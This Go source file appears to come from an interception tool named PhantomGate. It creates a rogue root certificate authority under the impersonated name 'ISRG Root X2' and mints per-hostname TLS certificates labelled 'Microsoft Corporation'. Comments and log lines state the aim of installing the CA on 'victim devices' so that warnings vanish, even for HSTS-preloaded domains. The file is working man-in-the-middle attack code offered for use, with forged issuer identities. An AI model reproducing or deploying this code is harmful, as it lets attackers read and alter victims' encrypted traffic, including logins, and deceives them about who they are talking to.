package certgen

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// PhantomCA generates and manages a root CA and per-domain TLS certificates.
// When the victim installs our root CA, all certificate warnings disappear —
// even for HSTS-preloaded domains.
type PhantomCA struct {
	caCert    *x509.Certificate
	caKey     *ecdsa.PrivateKey
	caCertPEM []byte
	certCache map[string]*tls.Certificate
	mu        sync.RWMutex
	caDir     string
}

func NewPhantomCA(dataDir string) (*PhantomCA, error) {
	caDir := filepath.Join(dataDir, "ca")
	if err := os.MkdirAll(caDir, 0700); err != nil {
		return nil, fmt.Errorf("failed to create CA directory: %w", err)
	}

	ca := &PhantomCA{
		certCache: make(map[string]*tls.Certificate),
		caDir:     caDir,
	}

	certPath := filepath.Join(caDir, "ca-cert.pem")
	keyPath := filepath.Join(caDir, "ca-key.pem")

	if fileExists(certPath) && fileExists(keyPath) {
		if err := ca.loadCA(certPath, keyPath); err != nil {
			log.Printf("[CA] Existing CA failed to load, regenerating: %v", err)
			if err := ca.generateCA(); err != nil {
				return nil, err
			}
		}
	} else {
		if err := ca.generateCA(); err != nil {
			return nil, err
		}
	}

	log.Printf("[CA] Root CA ready: %s", certPath)
	log.Printf("[CA] Install this CA cert on victim devices to eliminate certificate warnings")

	return ca, nil
}

func (ca *PhantomCA) generateCA() error {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("failed to generate CA key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))

	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			Organization: []string{"Internet Security Research Group"},
			CommonName:   "ISRG Root X2",
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		BasicConstraintsValid: true,
		IsCA:                  true,
		MaxPathLen:            1,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return fmt.Errorf("failed to create CA cert: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return fmt.Errorf("failed to parse CA cert: %w", err)
	}

	ca.caCert = cert
	ca.caKey = key
	ca.caCertPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	certPath := filepath.Join(ca.caDir, "ca-cert.pem")
	keyPath := filepath.Join(ca.caDir, "ca-key.pem")

	if err := os.WriteFile(certPath, ca.caCertPEM, 0644); err != nil {
		return fmt.Errorf("failed to write CA cert: %w", err)
	}

	keyDER, _ := x509.MarshalECPrivateKey(key)
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
		return fmt.Errorf("failed to write CA key: %w", err)
	}

	log.Printf("[CA] Generated new root CA certificate")
	return nil
}

func (ca *PhantomCA) loadCA(certPath, keyPath string) error {
	certPEM, err := os.ReadFile(certPath)
	if err != nil {
		return err
	}
	keyPEM, err := os.ReadFile(keyPath)
	if err != nil {
		return err
	}

	certBlock, _ := pem.Decode(certPEM)
	if certBlock == nil {
		return fmt.Errorf("failed to decode CA cert PEM")
	}
	cert, err := x509.ParseCertificate(certBlock.Bytes)
	if err != nil {
		return err
	}

	keyBlock, _ := pem.Decode(keyPEM)
	if keyBlock == nil {
		return fmt.Errorf("failed to decode CA key PEM")
	}
	key, err := x509.ParseECPrivateKey(keyBlock.Bytes)
	if err != nil {
		return err
	}

	ca.caCert = cert
	ca.caKey = key
	ca.caCertPEM = certPEM
	return nil
}

// GetCertForHost generates (or returns cached) a TLS certificate for the given hostname.
// The cert is signed by our CA, so it validates if the victim has installed our CA cert.
func (ca *PhantomCA) GetCertForHost(hostname string) (*tls.Certificate, error) {
	ca.mu.RLock()
	if cached, ok := ca.certCache[hostname]; ok {
		ca.mu.RUnlock()
		return cached, nil
	}
	ca.mu.RUnlock()

	ca.mu.Lock()
	defer ca.mu.Unlock()

	// Double-check after acquiring write lock
	if cached, ok := ca.certCache[hostname]; ok {
		return cached, nil
	}

	cert, err := ca.generateCertForHost(hostname)
	if err != nil {
		return nil, err
	}

	ca.certCache[hostname] = cert
	return cert, nil
}

func (ca *PhantomCA) generateCertForHost(hostname string) (*tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))

	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName:   hostname,
			Organization: []string{"Microsoft Corporation"},
		},
		NotBefore:             time.Now().Add(-1 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{hostname, "*." + hostname},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, ca.caCert, &key.PublicKey, ca.caKey)
	if err != nil {
		return nil, fmt.Errorf("failed to generate cert for %s: %w", hostname, err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, _ := x509.MarshalECPrivateKey(key)
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}

	return &tlsCert, nil
}

// GetTLSConfig returns a tls.Config that dynamically serves certificates
// for any hostname, all signed by our root CA.
func (ca *PhantomCA) GetTLSConfig() *tls.Config {
	return &tls.Config{
		GetCertificate: func(info *tls.ClientHelloInfo) (*tls.Certificate, error) {
			return ca.GetCertForHost(info.ServerName)
		},
	}
}

// CACertPEM returns the root CA certificate in PEM format for distribution
func (ca *PhantomCA) CACertPEM() []byte {
	return ca.caCertPEM
}

// CACertPath returns the path to the CA cert file
func (ca *PhantomCA) CACertPath() string {
	return filepath.Join(ca.caDir, "ca-cert.pem")
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// GenerateSelfSigned creates a self-signed TLS certificate for the given domain
func GenerateSelfSigned(domain string) (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate key: %w", err)
	}

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate serial: %w", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName:   domain,
			Organization: []string{"PhantomGate"},
		},
		NotBefore:             time.Now().Add(-1 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{domain, "*." + domain},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to create cert: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to marshal key: %w", err)
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return tls.X509KeyPair(certPEM, keyPEM)
}
